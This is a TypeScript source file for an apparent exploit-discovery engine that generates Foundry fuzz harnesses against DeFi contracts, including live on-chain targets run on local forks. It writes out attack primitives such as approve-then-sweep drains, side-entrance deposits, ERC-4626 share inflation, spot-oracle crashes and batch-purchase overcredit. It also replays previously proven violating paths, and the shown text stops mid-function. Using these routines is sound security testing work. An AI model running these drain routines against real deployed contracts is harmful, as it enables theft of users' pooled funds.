// Generic invariant-harness engine — Stage 1 of the capability ladder.
//
// Instead of asking "do I have a template/recipe for this shape?", the agent
// asks "which UNIVERSAL properties must this shape satisfy?", generates a
// fuzzed invariant harness over the target's callable surface, and lets the
// fuzzer find a violating sequence from bounded primitives. No per-challenge
// recipe required.
//
// Universal property catalog (emitted per detected shape):
//   native conservation : the searcher's native balance never exceeds what it
//                         held after setup (balance-based, not event-based —
//                         catches side-entrance, credit confusion, forced fees,
//                         overpayments, everything). Any leftover flash-loan
//                         money IS the theft; honest loans net to zero.
//   lender solvency     : the target's asset-token balance never falls below
//                         the seed parked there at setup (catches approve-then-
//                         sweep / arbitrary-call drains; honest flash loans
//                         restore the balance before returning).
//   victim credit       : a third-party victim's deposit stays redeemable
//                         (native lender shapes).
//   ERC-4626 round-trip : a victim's shares always redeem for >= their deposit
//                         (minus fee/rounding tolerance); zero shares minted
//                         on deposit is an immediate violation.
//   tracked-mint supply : totalSupply never grows beyond mints the harness
//                         itself performed (unauthorized-mint paths).
//
// Why balance-based: event-accounting of "value deposited/extracted" miscounts
// flash-loan callbacks (the loaned ETH must NOT count as searcher deposits, or
// the side-entrance drain looks legitimate) and self-donation round-trips.
// Final-balance checks are immune to both.
//
// Shapes NOT covered here return null and callers fall through to the
// existing recipes/probes: signature-gated bridges (bridge recipe). AMM v2
// pairs ARE covered since 2026-10-01 (address-mode amm-v2 generator below —
// the 1,300+ live pair rows); governance surfaces are detected and recorded
// as a named dead-end until Governor-lifecycle codegen lands. Honest
// out-of-scope beats a harness that cannot faithfully express the property.
//
// Safety: the generated code is a TEST contract that runs under `forge test`
// with the same rails as every other harness — local RPC only, no broadcast,
// bounded primitives, fuzzer-driven sequences. The LLM is not involved at all
// in this engine.
import { writeFileSync, mkdirSync, renameSync } from "node:fs";
import { join } from "node:path";
import { AGENT_TEST_DIR, REPORT_DIR } from "./config.ts";
import { parseSolidityAbi, entrypoints, views, type FnAbi, type Param, type ParsedAbi } from "./abiparse.ts";
import { toChecksumAddress, sanitizeSoliditySource } from "./fork.ts";
import { knownViolations, recordDeadend } from "./genlearn.ts";

export type GenShape =
  | "lender-native"
  | "lender-asset"
  | "lender-arbitrary-call"
  | "erc4626"
  | "token"
  | "marketplace-batch"
  | "oracle-spot"
  | "amm-v2"
  | "governance";

export interface HarnessInput {
  challengeName: string;
  sources: string[]; // verified source text (Solidity)
  /** source mode: paths of the challenge sources, for the import line (e.g.
   * src/challenges/SideEntranceLenderPool.sol). Used to deploy the target. */
  sourcePaths?: string[];
  mode: "source" | "address";
  /** address mode: the checksummed on-chain target to bind to. */
  bindAddress?: string;
  chainId?: string;
}

export interface BuiltHarness {
  contractName: string;
  filePath: string;
  shape: GenShape;
  skippedFns: string[]; // entrypoints excluded (unsupported signatures) — surfaced in the harness header
}

export interface GenEvaluation {
  discovered: boolean;
  invariant: string; // e.g. "native-conservation"
  compileError: boolean;
  /** Compiler output when it failed — a harness that cannot build is an agent
   * bug, and the old log said only that, with no way to diagnose it. */
  compileErrorDetail?: string;
  setupFailed: boolean;
  /** Why setUp() failed (shape/constructor mismatch). */
  setupFailedDetail?: string;
  path: string; // [GEN_PATH] steps, joined
  profitWei: string | null; // deficit measured at violation time, when emitted
}

// ---------------------------------------------------------------- detection

/** The three feature flags the generic engine needs, computed from SOURCE
 * TEXT. (discovery.extractFeatures takes file PATHS and reads them itself —
 * passing text there throws.) Same regexes where they overlap, broadened for
 * .call with call-value braces. */
function featuresOfText(src: string): { makesArbitraryCall: boolean; hasFlashLoan: boolean; hasEtherCallback: boolean } {
  return {
    makesArbitraryCall: /\.call\s*(?:\{[^}]*\})?\s*\(|\(data\)\s*;/.test(src),
    hasFlashLoan: /\bflashLoan\b/.test(src),
    hasEtherCallback: /\b(execute|receiveEther)\s*[({]/.test(src),
  };
}

function sigOf(f: FnAbi): string {
  return `${f.name}(${f.params.map((p) => p.type).join(",")})`;
}

/** Classify the callable surface into a harnessable shape (or null). */
export function detectShape(abi: ParsedAbi, source: string): GenShape | null {
  const all = abi.functions;
  // Marketplace-batch: buyMany(uint256[])-style batch purchase over an NFT
  // constructor param — the free-rider class (per-item price checks that
  // carry over across a batch, seller paid from pool funds).
  if (
    all.some((f) => /buy/i.test(f.name) && f.params.some((p) => p.type.endsWith("[]"))) &&
    all.some((f) => /offer|list/i.test(f.name))
  ) {
    return "marketplace-batch";
  }
  // Oracle-spot: a borrow entrypoint priced by an on-the-spot AMM ratio
  // (computeOraclePrice / pair reserves) — the puppet class.
  if (all.some((f) => f.name === "computeOraclePrice") && all.some((f) => /borrow/i.test(f.name))) {
    return "oracle-spot";
  }
  // AMM v2 pair: the raw constant-product surface (token0/token1 + getReserves
  // + swap/sync/skim/mint/burn). The single largest live watchlist class —
  // detected BEFORE the lender/token fallbacks so a pair's mint() is never
  // mistaken for a token mint. NOTE: token0/token1 are PUBLIC STATE VARIABLES
  // on real pairs (they generate getters, not function declarations), so they
  // are looked up in publicVars as well as functions.
  const varNames = new Set(abi.publicVars.map((v) => v.name));
  const hasToken0 = all.some((f) => f.name === "token0" && f.mutability === "view") || varNames.has("token0");
  const hasToken1 = all.some((f) => f.name === "token1" && f.mutability === "view") || varNames.has("token1");
  if (
    hasToken0 && hasToken1 &&
    all.some((f) => f.name === "getReserves" && f.mutability === "view") &&
    all.some((f) => /^(swap|sync|skim|mint)$/.test(f.name))
  ) {
    return "amm-v2";
  }
  // Governance: propose + vote + queue/execute lifecycle (OZ-Governor shape).
  // Detection is real (it names the class in dead-end/triage hints) but
  // codegen is not implemented yet — buildHarness records the gap honestly.
  if (
    all.some((f) => /propose/i.test(f.name)) &&
    all.some((f) => /vote/i.test(f.name)) &&
    all.some((f) => /execute|queue/i.test(f.name))
  ) {
    return "governance";
  }
  // ERC-4626: deposit(uint256,address) + redeem(uint256,address,address) [+ asset()]
  if (
    all.some((f) => sigOf(f) === "deposit(uint256,address)") &&
    all.some((f) => sigOf(f) === "redeem(uint256,address,address)" || f.name === "asset")
  ) {
    return "erc4626";
  }
  // Token: totalSupply + balanceOf getters and a mint entrypoint.
  const hasSupply = all.some((f) => f.name === "totalSupply" && f.mutability === "view");
  const hasBal = all.some((f) => sigOf(f) === "balanceOf(address)" && f.mutability === "view");
  const hasMint = all.some((f) => /^mint/.test(f.name) && f.params.some((p) => p.type === "uint256"));
  if (hasSupply && hasBal && hasMint) return "token";
  // Native lender: payable deposit() 0-arg + a withdraw surface.
  const dep0 = all.find((f) => sigOf(f) === "deposit()" && f.mutability === "payable");
  const hasWithdraw = all.some((f) => /^withdraw/.test(f.name) && (f.visibility === "external" || f.visibility === "public"));
  if (dep0 && hasWithdraw) return "lender-native";
  // Arbitrary-call lender: a flash-loan entrypoint that executes borrower-
  // chosen calldata from the pool's own context (Truster class). Detected
  // BEFORE the generic asset-lender check — it gets its own primitives.
  const feats = featuresOfText(source);
  if (feats.makesArbitraryCall && feats.hasFlashLoan) return "lender-arbitrary-call";
  // Asset lender: deposit(uint256)-style deposit surface over a
  // constructor/token ERC-20.
  const depUint = all.some((f) => /^deposit\(/.test(sigOf(f)) && f.params.some((p) => p.type === "uint256"));
  if (depUint) return "lender-asset";
  return null;
}

// ------------------------------------------------------- codegen helpers

// 8 seed slots: prims cap at 14 params and multi-param functions (e.g.
// setLimits(uint256,uint256,uint256,uint256,uint256)) broke SEEDS[i]! with a
// runtime-undefined that emitted literally into the harness ("undefined % 1e24")
// and killed the whole test/agent compile. Guard below + longer array.
const SEEDS = ["s0", "s1", "s2", "s3", "s4", "s5", "s6", "s7"];

/** Unsupported param types are skipped honestly (logged in the harness).
 * All bytes/string types (dynamic and fixed) are excluded: plain bytes has no
 * meaningful generic primitive (a uint seed is not calldata) and everything
 * carrying signatures/ids belongs to the dedicated bridge recipe — allowing
 * bytes here produced interfaces without data locations (Error 6651) and
 * type-mismatched call sites on live targets like the Karpatkey gate vault. */
function paramSupported(t: string): boolean {
  const base = t.replace(/\s+/g, " ");
  if (/string|bytes|\[\]|\]|mapping|contract|function|enum|struct|tuple/.test(` ${base}`)) return false;
  return /^(u?int\d*|address|address payable|bool)$/.test(base);
}

/** Actor selection among the bounded set: searcher, victim, target. */
function actorExpr(s: string): string {
  return `(${s} % 3 == 0 ? address(this) : ${s} % 3 == 1 ? victim : address(target))`;
}

function decodeArg(p: Param, seed: string): string {
  const t = p.type;
  const intM = /^u?int(\d*)$/.exec(t);
  if (intM) {
    const expr = `${seed} % 1e24`; // bounded amounts; contextual caps applied before
    // Every int type except uint256 itself needs an EXPLICIT cast from the
    // uint256 seed expression: Solidity has no implicit uint256→uintN/intN
    // conversion (error 9553, including int256 — a "width 256" int) — an
    // uncast seed fails the whole test/agent compile and poisons every
    // other campaign.
    return t === "uint256" ? expr : `${t}(${expr})`;
  }
  if (t === "address" || t === "address payable") return actorExpr(seed);
  if (t === "bool") return `${seed} % 2 == 1`;
  return seed;
}

function fnMutability(f: FnAbi): string {
  return f.mutability === "view" || f.mutability === "pure" ? ` view` : f.mutability === "payable" ? ` payable` : "";
}

/** Interface declaration with TRUE return types (try-catch bindings and
 * downstream calls must match the real ABI or the harness will not compile).
 * Dynamic types get their REQUIRED data location: params take calldata,
 * returns take memory (Solidity 6651 — missing location kills the whole
 * test tree, poisoning every other campaign in the process). */
function ifaceDecl(f: FnAbi): string {
  const loc = (t: string, kind: "param" | "ret"): string => {
    const dyn = /^(bytes|string)$/.test(t) || t.includes("[");
    if (!dyn) return t;
    return kind === "param" ? `${t} calldata` : `${t} memory`;
  };
  const params = f.params.map((p) => loc(p.type, "param")).join(",");
  const rets = f.returns.length > 0 ? ` returns (${f.returns.map((r) => loc(r.type, "ret")).join(", ")})` : "";
  return `function ${f.name}(${params}) external${fnMutability(f)}${rets};`;
}

/** Guess constructor args for source-mode deployment from param names/types. */
function ctorArg(p: Param, hasAsset: boolean): string | null {
  const t = p.type;
  const n = p.name.toLowerCase();
  if (/^u?int\d*$/.test(t)) return "2";
  if (t === "bool") return "false";
  if (t === "address" || t === "address payable") {
    if (hasAsset && /token|asset|underlying|staking|dvt|damn/i.test(n)) return "address(assetToken)";
    return "address(this)"; // honest fallback (pairs/oracles can't be synthesized generically)
  }
  if (t === "string") return '"GEN"';
  return null; // unsupported → shape skipped
}

// ------------------------------------------------------------ the generator

export function buildHarness(input: HarnessInput, variantIdx: number): BuiltHarness | null {
  const source = input.sources.join("\n\n");
  const abi = parseSolidityAbi(source);

  const shape = detectShape(abi, source);
  if (!shape) return null;
  // Governance is detected but not yet code-generated — name the gap once per
  // shape instead of silently falling out as "no harnessable shape".
  if (shape === "governance") {
    try { recordDeadend(shape, "governance surface detected — harness codegen not implemented yet (OZ-Governor lifecycle is future work)"); } catch {}
    return null;
  }
  // AMM v2 pairs get a dedicated generator: the raw pair surface (mint/burn/
  // swap/skim/sync) needs purpose-built primitives, not generic ABI fuzzing.
  if (shape === "amm-v2") return buildAmmHarness(input, variantIdx);

  // SOURCE-MODE NAME RESOLUTION: source-mode harnesses deploy the challenge
  // by a contract name that MUST exist in the source (new <Name>(...) + an
  // import of the source path). When the requested name isn't declared, the
  // old code emitted it anyway — a guaranteed compile failure (Error 2904)
  // that poisoned the whole test/agent tree. Resolve honestly: use the
  // requested name when declared, else the source's single declared contract,
  // else refuse before writing anything.
  let resolvedDeployName: string | null = null;
  if (input.mode !== "address") {
    const requested = contractTargetName(input.challengeName);
    const declared = [...new Set([...source.matchAll(/\b(?:abstract\s+)?contract\s+(\w+)/g)].map((m) => m[1]!))];
    if (declared.includes(requested)) {
      resolvedDeployName = requested;
    } else if (declared.length === 1) {
      resolvedDeployName = declared[0]!;
    } else {
      try { recordDeadend(shape, `source-mode deploy target "${requested}" is not declared in the source (declared: ${declared.slice(0, 5).join(", ") || "none"}) — harness refused instead of emitting a guaranteed compile failure`); } catch {}
      return null;
    }
  }
  // Hoisted here (not at assembly) — the source-mode setup block references it
  // earlier, and const-before-use across those blocks is a TDZ error.
  const deployNameForEmit = resolvedDeployName ?? contractTargetName(input.challengeName);

  const eps = entrypoints(abi);
  const skippedFns: string[] = [];
  // DEDUPE BY NAME+ARITY: verified multi-contract sources (a vault that embeds
  // its own token, gate factories, etc.) declare the same function name on two
  // contracts; emitting a fuzz primitive per occurrence produced duplicate
  // function definitions (Error 1686) — a compile error that poisons the whole
  // test tree. One primitive per name+arity; the fuzz_* name is the identity.
  const seenSigs = new Set<string>();
  const usable = eps.filter((f) => {
    const dedupeKey = `${f.name}/${f.params.length}`;
    if (seenSigs.has(dedupeKey)) {
      skippedFns.push(sigOf(f));
      return false;
    }
    seenSigs.add(dedupeKey);
    if (f.params.length > 5 || f.params.some((p) => !paramSupported(p.type))) {
      skippedFns.push(sigOf(f));
      return false;
    }
    return true;
  });
  // The arbitrary-call shape gets a dedicated encodeWithSignature primitive
  // (its flashLoan carries bytes, so nothing else is fuzzable) — an empty
  // usable set is fine there as long as the surface exists.
  const arbShape = shape === "lender-arbitrary-call" && !!eps.find((f) => /flashLoan|execute|call/i.test(f.name) && f.params.some((p) => p.type === "bytes"));
  if (usable.length === 0 && !arbShape) {
    // Learned dead end: shape detected but nothing fuzzable survived the
    // signature filter — record so triage can warn about the class.
    try {
      recordDeadend(shape, "no fuzzable primitives: every entrypoint carries array/bytes/string/struct params the generic fuzzer cannot seed");
    } catch {}
    return null;
  }

  // LEARNED PRIORS: the newest PROVEN violating path recorded for this shape
  // (reports/genlearn.json) becomes a deterministic REPLAY primitive in every
  // future harness of the same shape — a directed attack, not a reorder hint.
  let learnedSteps: string[] = [];
  let learnedNote = "";
  try {
    const viols = knownViolations(shape);
    if (viols.length > 0) {
      const newest = viols[viols.length - 1]!;
      learnedSteps = [...new Set(
        newest.path
          .split(" -> ")
          .map((s) => s.replace(/^fuzz_/, "").trim()) // [GEN_PATH] logs bare names
          .filter(Boolean)
      )];
      const invs = [...new Set(viols.map((v) => v.invariant))].join(", ");
      learnedNote = `${viols.length} proven violating path(s) on this shape (invariants: ${invs}) — replayed via fuzz_replayLearned`;
    }
  } catch {
    learnedSteps = []; // learning is best-effort, never a codegen dependency
  }

  // Cap the primitive count to keep invariant runs bounded.
  const prims = usable.slice(0, 14);
  for (const f of usable.slice(14)) skippedFns.push(sigOf(f));

  const feats = featuresOfText(source);
  const isAddress = input.mode === "address";
  const nameBase = (isAddress ? `GenFork_${(input.bindAddress ?? "").replace(/^0x/, "").slice(0, 10)}` : `Gen_${input.challengeName}`)
    .replace(/[^A-Za-z0-9_]/g, "_");
  const contractName = `${nameBase}_v${variantIdx}`;
  const targetAddr = isAddress ? toChecksumAddress(input.bindAddress!) : null;

  // Shape-specific facts.
  const dep0 = prims.find((f) => sigOf(f) === "deposit()" && f.mutability === "payable");
  const depUint = prims.find((f) => /^deposit\(/.test(sigOf(f)) && f.params.some((p) => p.type === "uint256"));
  const depositAmountArgIdx = depUint?.params.findIndex((p) => p.type.startsWith("uint")) ?? -1;
  const needsAsset = shape === "erc4626" || shape === "lender-asset" || shape === "lender-arbitrary-call" || shape === "oracle-spot";
  // Array-param entrypoints (buyMany/offerMany) are NEVER in prims (arrays are
  // excluded from generic fuzzing) — search all entrypoints; the dedicated
  // batch primitives below call them via typed iface / encodeWithSignature.
  const buyMany = shape === "marketplace-batch" ? eps.find((f) => /buy/i.test(f.name) && f.params.some((p) => p.type.endsWith("[]"))) : undefined;
  const offerMany = shape === "marketplace-batch" ? eps.find((f) => /offer|list/i.test(f.name)) : undefined;
  // The arbitrary-call surface carries a `bytes` param, so it is NEVER in
  // prims (bytes params are excluded from fuzzing) — search all entrypoints.
  const arbFn = eps.find(
    (f) => /flashLoan|execute|call/i.test(f.name) && f.params.some((p) => p.type === "bytes")
  );
  const flashSelf = prims.find((f) => sigOf(f) === "flashLoan(uint256)");
  const mintFn = shape === "token" ? prims.find((f) => /^mint/.test(f.name) && f.params.some((p) => p.type === "uint256")) : undefined;
  const mintAmtIdx = mintFn?.params.findIndex((p) => p.type.startsWith("uint")) ?? -1;
  const callbackStyle = feats.hasEtherCallback && shape === "lender-native" && !!flashSelf;

  // ---- interface: primitives + getters used by invariants ----
  // OVERLOAD-SAFE: the map carries EVERY declaration per name. A name-keyed
  // single-decl map let overloaded entries (deposit(uint256,address) vs
  // deposit(uint256,address,address)) overwrite each other while emitted calls
  // followed each overload's own arity — error 6160 (wrong argument count) and
  // whole-tree compile poison on every such target.
  const iface = new Map<string, string[]>();
  // CANONICAL DEDUPE: Solidity treats `uint`/`uint256` (and `int`/`int256`,
  // `byte`/`bytes1`) as the SAME type. A verified source declaring
  // `totalSupply() returns (uint)` plus the static catalog entry below
  // (`returns (uint256)`) are one signature — but the textual `includes`
  // dedupe emitted both, Error 1686, whole test/agent tree poisoned. Dedupe
  // on a canonicalized key (aliases folded, whitespace collapsed); first
  // declaration seen wins.
  const canonDecl = (d: string): string =>
    d.replace(/\buint\b/g, "uint256")
     .replace(/\bint\b/g, "int256")
     .replace(/\bbyte\b/g, "bytes1")
     .replace(/\s+/g, " ").trim();
  const addIface = (name: string, decl: string): void => {
    const arr = iface.get(name) ?? [];
    const key = canonDecl(decl);
    if (!arr.some((x) => canonDecl(x) === key)) arr.push(decl);
    iface.set(name, arr);
  };
  for (const f of prims) addIface(f.name, ifaceDecl(f));
  for (const v of views(abi)) {
    if (["totalSupply", "balanceOf", "asset", "convertToAssets"].includes(v.name)) {
      addIface(v.name, ifaceDecl(v));
    }
  }
  if (shape === "erc4626") addIface("asset", "function asset() external view returns (address);");
  // victimExit may call target.redeem — redeem may sit beyond the 14-primitive
  // cap, so declare it unconditionally or the harness references an undeclared
  // ITarget member (error 9582, whole-tree poison).
  if (shape === "erc4626") addIface("redeem", "function redeem(uint256,address,address) external returns (uint256);");
  addIface("totalSupply", "function totalSupply() external view returns (uint256);");
  addIface("balanceOf", "function balanceOf(address) external view returns (uint256);");
  // Array-param entrypoints (buyMany/offerMany) are NEVER in prims (arrays are
  // excluded from generic fuzzing) — declare them so the dedicated batch
  // primitives below can call them with typed args instead of raw encodings.
  if (buyMany) addIface(buyMany.name, ifaceDecl(buyMany));
  if (offerMany) addIface(offerMany.name, ifaceDecl(offerMany));

  // ---- primitives ----
  const primLines: string[] = [];
  for (const f of prims) {
    const seeds = SEEDS.slice(0, f.params.length).map((s) => `uint256 ${s}`);
    const decodes: string[] = [];
    const args: string[] = [];
    let valueExpr: string | null = null;
    let valueArgIdx = -1;
    const isMintTry = !!mintFn && f === mintFn;

    // A function with more params than seed slots must be skipped WHOLE:
    // SEEDS[i]! would be a runtime-undefined that emits literally into the
    // Solidity source (`undefined % 1e24` → undeclared identifier, compile
    // error 7576) and breaks the whole test/agent directory.
    if (f.params.length > SEEDS.length) {
      skippedFns.push(`${sigOf(f)} (${f.params.length} params exceed ${SEEDS.length} seed slots)`);
      continue;
    }
    for (let i = 0; i < f.params.length; i++) {
      const p = f.params[i]!;
      const seed = SEEDS[i]!;
      if (f.mutability === "payable" && i === 0 && p.type === "uint256") {
        // Payable fn with a leading uint256: that param doubles as the
        // msg.value seed AND stays a real argument (collateral-coupled to
        // size — borrow(amount) semantics). Arity must be preserved.
        decodes.push(`uint256 v = bound(${seed}, 0, address(this).balance / 2);`);
        valueExpr = "v";
        valueArgIdx = i;
        args.push("v");
        continue;
      }
      if (f === flashSelf && p.type.startsWith("uint")) {
        decodes.push(`uint256 amt = bound(${seed}, 0, address(target).balance);`);
        args.push(p.type === "uint256" ? "amt" : `${p.type}(amt)`);
        continue;
      }
      if (isMintTry && i === mintAmtIdx) {
        decodes.push(`uint256 mintAmt = bound(${seed}, 0, 1e24);`);
        args.push("mintAmt");
        continue;
      }
      if (shape === "erc4626" && f === depUint && i === depositAmountArgIdx) {
        decodes.push(`uint256 amt = bound(${seed}, 0, assetToken.balanceOf(address(this)));`);
        args.push(p.type === "uint256" ? "amt" : `${p.type}(amt)`);
        continue;
      }
      if (shape === "lender-asset" && p.type.startsWith("uint") && /amount|amt|value|shares|assets|borrow/i.test(p.name)) {
        decodes.push(`uint256 amt${i} = bound(${seed}, 0, assetToken.balanceOf(address(target)) + 1);`);
        args.push(p.type === "uint256" ? `amt${i}` : `${p.type}(amt${i})`);
        continue;
      }
      if (shape === "lender-native" && p.type.startsWith("uint") && /amount|amt|value|shares|assets|borrow/i.test(p.name)) {
        // Withdrawal-size style params are bounded by the pool's real balance —
        // a uniform 0..1e24 range makes the steal window unreachable.
        decodes.push(`uint256 amt${i} = bound(${seed}, 0, address(target).balance);`);
        args.push(p.type === "uint256" ? `amt${i}` : `${p.type}(amt${i})`);
        continue;
      }
      args.push(decodeArg(p, seed));
    }

    const head = `    function fuzz_${f.name}(${seeds.join(", ")}) external {`;
    const body: string[] = [];
    body.push(...decodes.map((d) => `        ${d}`));
    // Zero-arg primitives have no seed to log — keep the path marker argless.
    body.push(
      f.params.length > 0
        ? `        console2.log("[GEN_PATH] ${f.name}", ${SEEDS[0]!});`
        : `        console2.log("[GEN_PATH] ${f.name}");`
    );
    // The value param stays a REAL argument (collateral-coupled to size), so
    // args already contains it — no filtering by valueArgIdx.
    const callArgs = args.join(", ");
    if (isMintTry) {
      body.push(`        try target.${f.name}(${args.join(", ")}) { trackedMints += mintAmt; } catch {}`);
    } else if (valueExpr) {
      body.push(`        target.${f.name}{value: ${valueExpr}}(${callArgs});`);
    } else {
      body.push(`        target.${f.name}(${callArgs});`);
    }
    primLines.push([head, ...body, "    }"].join("\n"));
  }

  // Extra engine primitives (not from the ABI — from the catalog).
  primLines.push(
    [
      "    /// Catalog primitive: donate native directly to the target (bypasses deposit()).",
      "    function fuzz_donateNative(uint256 s0) external {",
      "        uint256 v = bound(s0, 0, address(this).balance / 2);",
      '        console2.log("[GEN_PATH] donateNative", v);',
      '        (bool ok, ) = payable(address(target)).call{value: v}("");',
      "        ok;",
      "    }",
    ].join("\n")
  );
  const is4626Deposit = shape === "erc4626" && !!depUint && depUint.params.length === 2 && depUint.params[1]!.type === "address";
  if (is4626Deposit) {
    primLines.push(
      [
        "    /// Catalog primitive (4626): seed supply with 1 wei of shares — the",
        "    /// first-depositor setup for donation inflation; a 1-wei supply makes",
        "    /// later mint calcs round late depositors down to zero shares.",
        "    function fuzz_seedSupply1Wei() external {",
        "        if (target.totalSupply() != 0) return;",
        "        if (assetToken.balanceOf(address(this)) == 0) return;",
        '        console2.log("[GEN_PATH] seedSupply1Wei", uint256(1));',
        "        assetToken.approve(address(target), type(uint256).max);",
        `        try target.${depUint!.name}(1, address(this)) {} catch {}`,
        "    }",
      ].join("\n")
    );
    primLines.push(
      [
        "    /// Catalog primitive: donate the asset token directly (share-price inflation).",
        "    function fuzz_donateToken(uint256 s0) external {",
        "        uint256 amt = bound(s0, 0, assetToken.balanceOf(address(this)));",
        '        console2.log("[GEN_PATH] donateToken", amt);',
        "        assetToken.transfer(address(target), amt);",
        "    }",
      ].join("\n")
    );
  }
  if (shape === "lender-native") {
    primLines.push(
      [
        "    /// Side-entrance switch: when on, the flash-loan callback re-deposits the",
        "    /// loaned native into the target (books unbacked credit — the drain setup).",
        "    function fuzz_setCallbackDeposits(uint256 s0) external {",
        "        callbackDeposits = s0 % 2 == 1;",
        '        console2.log("[GEN_PATH] setCallbackDeposits", s0 % 2);',
        "    }",
      ].join("\n")
    );
  }
  if (shape === "lender-asset" && feats.makesArbitraryCall && arbFn) {
    // Build the arbitrary-call primitive: the pool executes attacker calldata
    // from its own context. The generated call passes approve/transfer data
    // for the asset token — the approve-then-sweep discovery path.
    const dataArgIdx = arbFn.params.findIndex((p) => p.type === "bytes");
    const callArgs = arbFn.params
      .map((p, i) => {
        if (i === dataArgIdx) return "data";
        if (p.type === "address") return "address(assetToken)";
        if (p.type === "bool") return "false";
        return "0";
      })
      .join(", ");
    const seeds = arbFn.params.map((_, i) => `uint256 s${i}`);
    primLines.push(
      [
        "    /// Catalog primitive: the target's arbitrary call becomes approve/transfer AS",
        "    /// the target — the approve-then-sweep discovery path (Truster-class).",
        `    function fuzz_arbCall(${seeds.join(", ")}) external {`,
        "        bool approveMode = s0 % 2 == 0;",
        "        uint256 amt = bound(s1, 0, assetToken.balanceOf(address(target)));",
        '        console2.log("[GEN_PATH] arbCall", approveMode ? uint256(1) : uint256(0));',
        "        bytes memory data = approveMode",
        '            ? abi.encodeWithSelector(ERC20Mintable.approve.selector, address(this), type(uint256).max)',
        '            : abi.encodeWithSelector(ERC20Mintable.transfer.selector, address(this), amt);',
        `        (bool ok, ) = address(target).call(abi.encodeWithSignature("${sigOf(arbFn)}", ${callArgs}));`,
        "        ok;",
        "    }",
      ].join("\n")
    );
    primLines.push(
      [
        "    /// Catalog primitive: sweep any allowance the target granted the searcher.",
        "    function fuzz_sweep(uint256 s0) external {",
        "        uint256 amt = bound(s0, 0, assetToken.allowance(address(target), address(this)));",
        "        if (amt == 0) return;",
        '        console2.log("[GEN_PATH] sweep", amt);',
        "        try assetToken.transferFrom(address(target), address(this), amt) {} catch {}",
        "    }",
      ].join("\n")
    );
  }
  if (shape === "lender-arbitrary-call" && arbFn) {
    // Truster-class: the pool's own flash loan executes attacker calldata from
    // the pool's context — approve-then-sweep, no borrower contract needed.
    const dataArgIdx2 = arbFn.params.findIndex((p) => p.type === "bytes");
    let addrSeen = 0;
    const callArgs2 = arbFn.params
      .map((p, i) => {
        if (i === dataArgIdx2) return "data";
        if (p.type === "address") {
          // First address = the caller identity (flash-loan fns require
          // borrower == msg.sender); later addresses = the call target.
          return addrSeen++ === 0 ? "address(this)" : "address(assetToken)";
        }
        if (p.type === "bool") return "false";
        return "0"; // zero-amount loan keeps the pool's solvency check happy
      })
      .join(", ");
    const seeds2 = arbFn.params.map((_, i) => `uint256 s${i}`);
    primLines.push(
      [
        "    /// Catalog primitive: the pool's arbitrary call executes approve/transfer AS",
        "    /// the pool — the approve-then-sweep discovery path.",
        `    function fuzz_arbCall(${seeds2.join(", ")}) external {`,
        "        bool approveMode = s0 % 2 == 0;",
        "        uint256 amt = bound(s1, 0, assetToken.balanceOf(address(target)));",
        '        console2.log("[GEN_PATH] arbCall", approveMode ? uint256(1) : uint256(0));',
        "        bytes memory data = approveMode",
        '            ? abi.encodeWithSelector(ERC20Mintable.approve.selector, address(this), type(uint256).max)',
        '            : abi.encodeWithSelector(ERC20Mintable.transfer.selector, address(this), amt);',
        `        (bool ok, ) = address(target).call(abi.encodeWithSignature("${sigOf(arbFn)}", ${callArgs2}));`,
        "        ok;",
        "    }",
      ].join("\n")
    );
    primLines.push(
      [
        "    /// Catalog primitive: sweep any allowance the pool granted the searcher.",
        "    function fuzz_sweep(uint256 s0) external {",
        "        uint256 amt = bound(s0, 0, assetToken.allowance(address(target), address(this)));",
        "        if (amt == 0) return;",
        '        console2.log("[GEN_PATH] sweep", amt);',
        "        try assetToken.transferFrom(address(target), address(this), amt) {} catch {}",
        "    }",
      ].join("\n")
    );
  }
  if (shape === "oracle-spot") {
    // Puppet-class: crash the spot oracle with one big token dump, then borrow
    // the pool's float against the wrecked price.
    primLines.push(
      [
        "    /// Catalog primitive: dump tokens into the AMM — crashes the spot oracle",
        "    /// the pool itself uses to price collateral.",
        "    function fuzz_dumpToken(uint256 s0) external {",
        "        uint256 amt = bound(s0, 0, assetToken.balanceOf(address(this)));",
        '        console2.log("[GEN_PATH] dumpToken", amt);',
        "        assetToken.approve(address(pair), type(uint256).max);",
        "        try pair.tokenToEthSwapInput(amt, 0, block.timestamp + 1) {} catch {}",
        "    }",
      ].join("\n")
    );
    primLines.push(
      [
        "    /// Catalog primitive: borrow from the pool — required collateral is",
        "        /// computed from the (now crashable) oracle price. The fuzzer owns",
        "        /// the collateral too: honest pricing takes it all (and refunds any",
        "        /// overpay), a crashed oracle takes far less than the float's worth.",
        "    function fuzz_borrowNative(uint256 s0, uint256 s1) external {",
        "        uint256 amt = bound(s0, 1, assetToken.balanceOf(address(target)));",
        "        uint256 v = bound(s1, 0, address(this).balance / 2);",
        '        console2.log("[GEN_PATH] borrowNative", amt);',
        "        try target.borrow{value: v}(amt) {} catch {}",
        "    }",
      ].join("\n")
    );
  }
  if (shape === "marketplace-batch" && buyMany && offerMany) {
    // Free-rider class: list NFTs, then buy the whole batch for one item's
    // price (checks carry over); the pool pays sellers from ITS float.
    primLines.push(
      [
        "    /// Catalog primitive: mint + list NFTs at a fixed price (honest listing).",
        "    function fuzz_listItems(uint256 s0) external {",
        "        uint256 n = (s0 % 3) + 1;",
        '        console2.log("[GEN_PATH] listItems", n);',
        "        uint256[] memory ids = new uint256[](n);",
        "        uint256[] memory prices = new uint256[](n);",
        "        for (uint256 i = 0; i < n; i++) {",
        "            ids[i] = nftToken.mint(address(this));",
        "            prices[i] = 1e18;",
        "            nftToken.approve(address(target), ids[i]);",
        "        }",
        `        try target.${offerMany.name}(ids, prices) {} catch {}`,
        "    }",
      ].join("\n")
    );
    primLines.push(
      [
        "    /// Catalog primitive: buy the batch. The fuzzer controls WHICH ids —",
        "    /// a batch whose later ids are unlisted/absent still passes one price",
        "        /// check per item with carry-over — the overcredit window.",
        `    function fuzz_buyBatch(uint256 s0, uint256 s1) external {`,
        "        uint256 id0 = s0 % 8;",
        `        uint256[] memory ids = new uint256[]((s1 % 3) + 1);`,
        "        for (uint256 i = 0; i < ids.length; i++) ids[i] = id0 + i;",
        '        console2.log("[GEN_PATH] buyBatch", ids.length);',
        `        try target.${buyMany.name}{value: 1e18}(ids) {} catch {}`,
        "    }",
      ].join("\n")
    );
  }
  if (shape === "token") {
    primLines.push(
      [
        "    /// Catalog primitive: move target-owned tokens to the searcher when a",
        "    /// balance/allowance path allows — any success here is real extraction.",
        "    function fuzz_sweep(uint256 s0) external {",
        "        uint256 amt = bound(s0, 0, target.balanceOf(address(target)));",
        "        if (amt == 0) return;",
